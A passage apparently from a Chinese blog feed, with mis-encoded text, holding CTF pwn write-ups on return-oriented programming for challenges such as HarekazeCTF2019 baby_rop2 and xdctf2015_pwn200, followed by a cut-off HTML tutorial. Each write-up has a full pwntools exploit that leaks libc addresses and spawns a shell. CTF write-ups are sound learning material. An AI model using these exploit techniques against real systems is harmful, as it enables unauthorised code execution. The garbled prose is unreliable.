href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>å‡½æ•°è¿‡ç¨‹å¾ˆç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©pintfå‡½æ•°æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°åœ¨å†…å­˜çš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcæ–‡ä»¶ä¸­è·å–ä¸€ä¸‹å…¶sympolæ˜¯çš„å€¼ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°shartå¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡åˆ©ç”¨onegadget RCEæ„é€ ç›¸å…³ropé“¾å³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *import timeio = process('./babyrop2')<span class="hljs-comment"># blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span><span class="hljs-comment"># context.log_level = 'debug'</span>libc = ELF('./libc.so.6')io = remote('node3.buuoj.cn',27694)elf = ELF('./babyrop2')offset = 40__libc_start_add = elf.got['__libc_start_main']start_add = 0x0400540 printf_add = elf.symbols['printf']aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols['__libc_start_main']rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    __libc_start_add,    0,    printf_add,    start_add]io.recvuntil('e? ')<span class="hljs-comment"># io.recvuntil('again, ')</span><span class="hljs-comment"># raw_input('-&gt;')</span>p = 'a' * offset + ''.join(map(p64,rop1))io.sendline(p)io.recvline_contains('again')s = io.recvline_contains('again')libc_base = int(u64(s[32:38].ljust(8,'\x00'))) - libc_start_sysRCE = libc_base + 0x4526a<span class="hljs-section">print('libc_base:'+hex(libc_base))</span>io.recvuntil('name? ')<span class="hljs-comment"># io.recvuntil('name? ')</span>p = '\x00' * offset + p64(RCE) + '\x00' * 70sleep(1)raw_input('-&gt;')io.sendline(p)io.interactive()</code></pre></div><h1 id="æ— libc"><a href="#æ— libc" class="headerlink" title="æ— libc"></a>æ— libc</h1><p>è¿™ä¸€éƒ¨åˆ†ç›®å‰ä¸»è¦æ˜¯åˆ©ç”¨LibcSearcheræ¥åšçš„ï¼Œæœ‰æ—¶å€™é¢˜ç›®ä¸ç»™libcï¼Œç”¨è¿™ä¸ªä¹Ÿå¯ä»¥è§£å†³éƒ¨åˆ†é¢˜ç›®ã€‚~~ç”¨è¿™ä¸ªä»¥åå°±ä¸èƒ½å¾ˆæ–¹ä¾¿çš„ç”¨onegadgetå»ä¸€é”®æ‹¿shelläº†ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œæƒ³åŠæ³•æ‹¿åˆ°LibcSearcherè·å–åˆ°çš„libcç‰ˆæœ¬å°±å¥½äº†ï¼Œæ‰¾ä¸ªæ—¶é—´å»å®è·µä¸€ä¸‹ï¼Œå…ˆæ…¢æ…¢æ„å»ºropé“¾å°±å¥½ï¼Œæ­£å¥½ç»ƒä¹ ä¸€ä¸‹è¿™ç§æ–¹æ³•æ‹¿shellã€‚~~<br>å·²ç»æµ‹è¯•å‡ºåŠæ³•å’¯ã€‚<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-3"><a href="#æŸ¥ä¿æŠ¤å’Œarch-3" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>å‡½æ•°ååˆ†ç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©putså‡½æ•°æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°çš„åœ°å€ï¼Œç„¶åå†ç”¨libcsearcheræ¥è·å–ä¸€ä¸‹å®ƒçš„libcç‰ˆæœ¬ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°æœ€åˆæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡è¿›è¡Œæº¢å‡ºæ„é€ å…³äº<code>system(&#39;/bin/sh&#39;)</code>çš„ropé“¾å³å¯ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *import time<span class="hljs-comment"># context.log_level = 'debug'</span>io = remote('node3.buuoj.cn',28661)<span class="hljs-comment"># io = process('./bjdctf_2020_babyrop')</span>elf = ELF('./bjdctf_2020_babyrop')<span class="hljs-comment"># blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span>io.recvuntil('story!\n')padding = 40libc_main_add = elf.got['__libc_start_main']puts_add = elf.symbols['puts']pop_rdi_ret = 0x0400733 p = 'a'*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,'\x00'))print(hex(s))obj = LibcSearcher(<span class="hljs-string">"__libc_start_main"</span>,s)libc_base = s - obj.dump(<span class="hljs-string">"__libc_start_main"</span>)system_add = libc_base + obj.dump(<span class="hljs-string">"system"</span>)binsh_add = libc_base + obj.dump(<span class="hljs-string">"str_bin_sh"</span>)sleep(1)io.recvuntil('story!\n')p = 'a'*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre></div><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-4"><a href="#æŸ¥ä¿æŠ¤å’Œarch-4" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>ä¸»ç¨‹åºä¸»è¦å°±æ˜¯é™åˆ¶äº†v2éœ€è¦ç­‰äº<code>ffff</code>æ‰èƒ½è¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œv2çš„å€¼æ˜¯<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>è¿™ä¸ªåœ¨readçš„æ—¶å€™æŠŠæ§å¥½ï¼Œè®©ffffå¡«å…¥è¿™ä¸ªä½ç½®å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>ç„¶åè¿›å…¥è¿™ä¸ªå¸¦æœ‰æº¢å‡ºæ¼æ´çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°bufçš„é¦–åœ°å€æ˜¯<code>ebp-0x10</code>ï¼Œ<img src="/2020/02/03/ROPç»ƒä¹ /images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>ç„¶ååˆ†æä¸‹è¿™é‡Œçš„æ±‡ç¼–ï¼Œå®ƒæŠŠreadå‡½æ•°çš„æº¢å‡ºä½ç½®è¿”å›å€¼<code>ebp-0x14</code>å–å‡ºæ¥ï¼Œä¸<code>0x8050000</code>è¿›è¡Œæ¯”è¾ƒã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæ˜¯é˜²æ­¢æˆ‘ä»¬è¿›è¡Œret2libcçš„ã€‚é‚£æˆ‘ä»¬æ„é€ è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªretæ¥è¿›è¡Œç»•è¿‡ã€‚</p><h4 id="æ€è·¯æ€»ç»“"><a href="#æ€è·¯æ€»ç»“" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p>å…ˆæ§åˆ¶å¥½v2è®©å…¶ç­‰äº<code>ffff</code>ï¼Œç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œç„¶åæ„é€ ropé“¾ï¼Œå…ˆæŠŠ<code>__libc_start_main</code>çš„å†…å­˜åœ°å€æ³„éœ²å‡ºæ¥ï¼Œç„¶åç”¨libcseacheræ¥ç¡®å®šlibcç‰ˆæœ¬ï¼Œ<br>ç„¶ådumpå‡º<code>__libc_start_mainçš„sympols</code>,ç®—å‡ºåŸºå€åï¼Œæ¥ç€è¿”å›åˆ°å¼€å§‹å¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œå†æ¬¡æº¢å‡ºè·ŸåŸæ¥ä¸€æ ·ã€‚ç„¶åå†æ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œæ³¨æ„retç»•è¿‡å¯¹å’±ä»¬æº¢å‡ºåœ°å€çš„æ£€æµ‹ï¼Œåœ¨è°ƒç”¨system(â€˜/bin/shâ€™)å³å¯ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *import time<span class="hljs-comment"># context.log_level = 'debug'</span>io = process('./easyrop')<span class="hljs-comment"># io = remote('183.129.189.60',10011)</span>io.recvuntil('TFer!\n')e =ELF('./easyrop')raw_input('-&gt;')padding = 36start_add = 0x08048400libc_start_main = e.got['__libc_start_main']puts_add = e.symbols['puts']ret = 0x0804839ep = 'f' * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil('name?\n')p = '\x00' * 0x18 + ''.join(map(p32,rop1))raw_input('&gt;')io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(<span class="hljs-string">"__libc_start_main"</span>,libc_start_add)libc_base = libc_start_add - obj.dump(<span class="hljs-string">"__libc_start_main"</span>)print(libc_base)system_add = obj.dump('system') + libc_basebinsh_add = obj.dump('str_bin_sh') + libc_baseio.recvuntil('TFer!\n')p = 'f' * paddingio.sendline(p)io.recvuntil('name?\n')rop2 = [    ret,    system_add,    start_add,    binsh_add]p = '\x00' * 0x14 + ''.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre></div><h2 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-5"><a href="#æŸ¥ä¿æŠ¤å’Œarch-5" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32ä½</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">int</span> <span class="hljs-function">__cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  be_nice_to_people();  vulnerable_function();  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">"Hello, World\n"</span>, <span class="hljs-number">0xD</span>u)</span></span>;&#125;</code></pre></div><p>ä¸»å‡½æ•°å¾ˆç®€å•ï¼Œæ¼æ´å‡½æ•°æ˜¯åœ¨ç¬¬äºŒä¸ªå‡½æ•°ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>æ ˆæº¢å‡ºï¼Œç„¶åç›´æ¥æ„é€ ropé“¾å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>åˆ©ç”¨æ€è·¯ï¼šç”¨wirteå‡½æ•°æ³„éœ²å‡º<code>__libc_start_main</code>åœ¨å†…å­˜åœ°å€ï¼Œç„¶åè¿”å›startæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç”¨libcseacherç¡®å®šä¸‹libcç‰ˆæœ¬ï¼Œç„¶åè¿›è¡Œæ„é€ system(â€˜/bin/shâ€™)çš„ropé“¾å³å¯ã€‚</p><p>è¿™ä¸ªæˆ‘æ˜¯å‘ç°å¯ä»¥ç”¨libcseacherç¡®å®šlibcç‰ˆæœ¬åï¼Œç”¨one_gadgetå·¥å…·è®¡ç®—RCEä½ç½®ï¼Œç„¶åå®ç°ret to RCEã€‚libcseacherè·å–åˆ°leakåœ°å€åï¼Œåœ¨æ‰§è¡Œdump libcå‰çš„æ—¶å€™ï¼Œä¼šå‘Šè¯‰ä½ ï¼Œå®ƒç¡®å®šçš„libcç‰ˆæœ¬å·æ˜¯å¤šå°‘ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>è¿™ä¸ªæ˜¯è®©ä½ é€‰æ‹©çš„ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>åœ¨ä¸‹è½½çš„libcseacheræ—¶å€™ï¼Œå…¶å®å®ƒæ˜¯æœ‰ä¸ªæ•°æ®åº“çš„ï¼Œè¿™é‡Œé¢å­˜ç€å„ç§libcç‰ˆæœ¬ï¼Œæ–¹ä¾¿å’±ä»¬ä½¿ç”¨ã€‚é‚£è¿™ä¸ªæ—¶å€™ï¼Œç›´æ¥ç”¨one_gadget è®¡ç®—ä¸‹RCEåç§»å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF('./2018_rop')<span class="hljs-comment"># io = process('./2018_rop')</span>io = remote('node3.buuoj.cn',29692)padding = 140 write_plt = elf.symbols['write']libc_start_main_got = elf.got['__libc_start_main']start = 0x080483C0 p = padding * '\x00' + flat([write_plt,start,1,libc_start_main_got,0x10])<span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher('__libc_start_main',libc_start_main_add)libc_base = libc_start_main_add - obj.dump('__libc_start_main')system_add = libc_base + obj.dump('system')binsh_add = libc_base + obj.dump('str_bin_sh')<span class="hljs-comment"># print(libc.symbols['__libc_start_main'])</span>print(hex(libc_base))<span class="hljs-comment"># io.recvline()</span>RCE = libc_base + 0x3cbecp = padding * '\x00' + p32(RCE) + padding * '\x00'<span class="hljs-comment"># p = padding * '\x00' + p32(system_add) + p32(start) + p32(binsh_add)</span>io.sendline(p)io.interactive()</code></pre></div><p>è¿™é‡Œé¢ä¸¤ç§åŠæ³•éƒ½è¡Œã€‚</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-6"><a href="#æŸ¥ä¿æŠ¤å’Œarch-6" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">   RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">   Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">   NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">   PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="idaåˆ†æ-6"><a href="#idaåˆ†æ-6" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œæ¼æ´åœ¨vulnå‡½æ•°ï¼š<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>paddingä¸º 6c+4 ä¸ªå­—èŠ‚ã€‚è·Ÿä¸Šé¢˜å¾ˆåƒçš„æ”»å‡»æ€è·¯ï¼Œç›´æ¥ç»™expäº†ã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-comment"># io = process('./bof')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27178</span>)elf = ELF(<span class="hljs-string">'./bof'</span>)libc = elf.libccontext.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>padding = <span class="hljs-number">112</span>start_add = <span class="hljs-number">0x080483E0</span>libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]write_plt = elf.symbols[<span class="hljs-string">'write'</span>]io.recvuntil(<span class="hljs-string">'2015~!\n'</span>)p = padding * <span class="hljs-string">'\x00'</span> + flat([write_plt,start_add,<span class="hljs-number">1</span>,libc_start_main_got,<span class="hljs-number">0x10</span>])io.sendline(p)libc_start_main_add = u32(io.recv(<span class="hljs-number">4</span>))obj = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(<span class="hljs-string">'__libc_start_main'</span>)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(<span class="hljs-string">'2015~!\n'</span>)rce = libc_base + <span class="hljs-number">0x3a80c</span>p = padding * <span class="hljs-string">'\x00'</span> + p32(rce) + padding * <span class="hljs-string">'\x00'</span>io.sendline(p)io.interactive()</code></pre></div><p>è¿˜æ˜¯æœ¬åœ°æ¥baseåº“æŸ¥libcçš„one_gadgetï¼Œç„¶året to rceã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML åŸºç¡€</title>
    <link href="/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="HTML-åŸºç¡€"><a href="#HTML-åŸºç¡€" class="headerlink" title="HTML åŸºç¡€"></a>HTML åŸºç¡€</h2><ol><li><strong>HTMLæ ‡é¢˜</strong>ï¼šæ˜¯é€šè¿‡ <code>&lt;h1&gt; - &lt;h6&gt;</code> æ ‡ç­¾æ¥å®šä¹‰çš„.ï¼›å…¶ä¼šå› ä¸ºæ•°å­—å˜åŒ–è€Œæ˜¾ç¤ºçš„å­—ä½“å¤§å°å˜åŒ–ï¼›</li><li><strong>HTMLæ®µè½</strong>ï¼šé€šè¿‡æ ‡ç­¾<code>&lt;p&gt;</code> æ¥å®šä¹‰çš„.</li><li><strong>HTMLé“¾æ¥</strong>ï¼šé€šè¿‡æ ‡ç­¾<code>&lt;a&gt;</code>æ¥å®šä¹‰çš„ã€‚</li><li><strong>HTMLå›¾åƒ</strong>ï¼šé€šè¿‡æ ‡ç­¾ <code>&lt;img&gt;</code> æ¥å®šä¹‰çš„ã€‚</li></ol><h2 id="HTML-æ–‡æœ¬"><a href="#HTML-æ–‡æœ¬" class="headerlink" title="HTML æ–‡æœ¬"></a>HTML æ–‡æœ¬</h2><h4 id="HTML-æ ‡é¢˜"><a href="#HTML-æ ‡é¢˜" class="headerlink" title="HTML æ ‡é¢˜"></a>HTML æ ‡é¢˜</h4><p>æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡<code>&lt;h1&gt; - &lt;h6&gt;</code> æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„.<code>&lt;h1&gt;</code> å®šä¹‰æœ€å¤§çš„æ ‡é¢˜ã€‚ <code>&lt;h6&gt;</code>å®šä¹‰æœ€å°çš„æ ‡é¢˜ã€‚<strong>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ ‡é¢˜çš„å‰åæ·»åŠ ç©ºè¡Œã€‚</strong></p><ul><li><p>æ ‡é¢˜å¾ˆé‡è¦ï¼š</p><p>ä¸è¦ä»…ä»…æ˜¯ä¸ºäº†ç”Ÿæˆ<strong>ç²—ä½“</strong>æˆ–<strong>å¤§å·</strong>çš„æ–‡æœ¬è€Œä½¿ç”¨æ ‡é¢˜ï¼Œè€Œæ˜¯==ä¸ºäº†ç”¨æˆ·å¯ä»¥é€šè¿‡æ ‡é¢˜æ¥å¿«é€Ÿæµè§ˆæ‚¨çš„ç½‘é¡µåº”è¯¥å°† h1 ç”¨ä½œä¸»æ ‡é¢˜==ï¼ˆæœ€é‡è¦çš„ï¼‰ï¼Œå…¶åæ˜¯ h2ï¼ˆæ¬¡é‡è¦çš„ï¼‰ï¼Œå†å…¶æ¬¡æ˜¯ h3ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p></li></ul><h4 id="HTML-æ³¨é‡Š"><a href="#HTML-æ³¨é‡Š" class="headerlink" title="HTML æ³¨é‡Š"></a>HTML æ³¨é‡Š</h4><p><strong>æ³¨é‡Š</strong>ï¼š å¼€å§‹æ‹¬å·ä¹‹åï¼ˆå·¦è¾¹çš„æ‹¬å·ï¼‰éœ€è¦ç´§è·Ÿä¸€ä¸ªå¹å·ï¼Œç»“æŸæ‹¬å·ä¹‹å‰ï¼ˆå³è¾¹çš„æ‹¬å·ï¼‰ä¸éœ€è¦ï¼Œåˆç†åœ°ä½¿ç”¨æ³¨é‡Šå¯ä»¥å¯¹æœªæ¥çš„ä»£ç ç¼–è¾‘å·¥ä½œäº§ç”Ÿå¸®åŠ©ã€‚ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š --&gt;</span></code></pre></div><h4 id="HTML-æ®µè½"><a href="#HTML-æ®µè½" class="headerlink" title="HTML æ®µè½"></a>HTML æ®µè½</h4><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚<strong>ï¼ˆ<code>&lt;/p&gt;</code>æ˜¯å—çº§å…ƒç´ ï¼‰</strong></p><h4 id="HTML-æ°´å¹³çº¿"><a href="#HTML-æ°´å¹³çº¿" class="headerlink" title="HTML æ°´å¹³çº¿"></a>HTML æ°´å¹³çº¿</h4><p>1ï¼š<code>&lt;hr&gt;</code>æ ‡ç­¾åœ¨ HTML é¡µé¢ä¸­åˆ›å»ºæ°´å¹³çº¿ã€‚</p><h4 id="HTML-æ–‡æœ¬æ ¼å¼åŒ–"><a href="#HTML-æ–‡æœ¬æ ¼å¼åŒ–" class="headerlink" title="HTML æ–‡æœ¬æ ¼å¼åŒ–"></a>HTML æ–‡æœ¬æ ¼å¼åŒ–</h4><p>é€šå¸¸ç”¨åˆ°<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>è¿™å‡ ä¸ªæ ‡ç­¾ã€‚</p><h4 id="ç»ƒä¹ ï¼š"><a href="#ç»ƒä¹ ï¼š" class="headerlink" title="ç»ƒä¹ ï¼š"></a>ç»ƒä¹ ï¼š</h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡æœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;h1&gt;æ ‡é¢˜1&lt;/h1&gt;&lt;h2&gt;æ ‡é¢˜2&lt;/h2&gt;&lt;h3&gt;æ ‡é¢˜3&lt;/h3&gt;&lt;h4&gt;æ ‡é¢˜4&lt;/h4&gt;&lt;h5&gt;æ ‡é¢˜5&lt;/h5&gt;&lt;h6&gt;æ ‡é¢˜6&lt;/h6&gt; --&gt;</span><span class="hljs-comment">&lt;!-- &lt;h&gt;æ ‡ç­¾æœ‰å¤§å°ä¹‹åˆ† --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äº”èŠ±å±±<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æˆ‘å®¶ä½åœ¨å¤§å±±é‡Œã€‚ä½ çŸ¥é“è¿™é‡Œçš„å±±æ˜¯ä»€ä¹ˆé¢œè‰²çš„å—ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ˜¥å¤©çš„å±±æ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æ·¡æ·¡çš„ï¼Œè®¸å¤šæ ‘å¶åˆšå†’å‡ºèŠ½æ¥ï¼Œè¿˜å¸¦ç€å«©å«©çš„é»„è‰²å‘¢ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å¤å¤©çš„å±±ä¹Ÿæ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æµ“æµ“çš„ï¼Œä¸€ç‰‡ç‰‡æ ‘å¶ï¼Œä¸ç®¡æ˜¯å¤§çš„è¿˜æ˜¯å°çš„ï¼Œéƒ½åƒè¢«ç»¿æ²¹å½©æ¶‚è¿‡ï¼Œè¿é›¨ç‚¹è½ä¸Šå»ï¼Œéƒ½ç»™æŸ“ç»¿äº†ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç§‹å¤©çš„å±±ä¸å†æ˜¯ä¸€ç§é¢œè‰²äº†ã€‚ä¸‹è¿‡ä¸€åœºç§‹éœœæœ‰çš„æ ‘æ—å˜æˆäº†é‡‘é»„è‰²â–¡å¥½åƒæ‰€æœ‰çš„é˜³å…‰éƒ½é›†ä¸­åˆ°é‚£å„¿å»äº†æœ‰çš„æ 